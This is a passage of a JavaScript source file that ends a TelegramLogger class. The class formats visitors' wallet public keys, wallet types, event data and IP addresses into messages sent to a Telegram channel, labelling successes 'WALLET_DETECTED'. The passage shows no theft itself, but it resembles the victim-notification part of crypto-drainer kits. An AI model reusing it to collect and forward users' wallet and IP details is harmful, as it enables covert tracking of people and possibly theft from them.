        `🌍 <b>IP:</b> ${data.ip || 'Unknown'}`;

      await this.sendMessage(message, data.result === 'success' ? 'WALLET_DETECTED' : 'ERROR');
    } catch (error) {
      console.error('[TELEGRAM] Failed to log business logic:', error.message);
    }
  }

  /**
   * Log unknown/unclassified events
   */
  async logUnknownEvent(data) {
    try {
      const message = `❓ <b>Unknown Event</b>\n\n` +
        `👤 <b>Wallet:</b> <code>${data.publicKey || 'Unknown'}</code>\n` +
        `💼 <b>Type:</b> ${data.walletType || 'Unknown'}\n` +
        `📋 <b>Event:</b> ${data.event || 'Unknown'}\n` +
        `📝 <b>Data:</b> ${JSON.stringify(data.data || {}, null, 2)}\n` +
        `🌍 <b>IP:</b> ${data.ip || 'Unknown'}\n` +
        `⏰ <b>Timestamp:</b> ${new Date().toLocaleString()}`;

      await this.sendMessage(message, 'ERROR');
    } catch (error) {
      console.error('[TELEGRAM] Failed to log unknown event:', error.message);
    }
  }
}

// Create singleton instance
const telegramLogger = new TelegramLogger();

// Export the singleton instance
module.exports = telegramLogger; 